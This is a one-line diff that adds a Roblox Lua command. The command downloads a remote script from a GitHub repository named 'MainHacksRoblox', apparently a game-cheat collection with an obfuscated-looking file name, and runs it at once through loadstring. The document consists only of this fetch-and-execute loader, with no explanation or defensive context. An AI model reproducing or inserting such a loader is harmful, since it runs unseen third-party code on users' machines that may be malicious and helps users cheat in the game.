@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jogamerforgames2022/MainHacksRoblox/main/Scripts/Protected%20(3).lua'))()
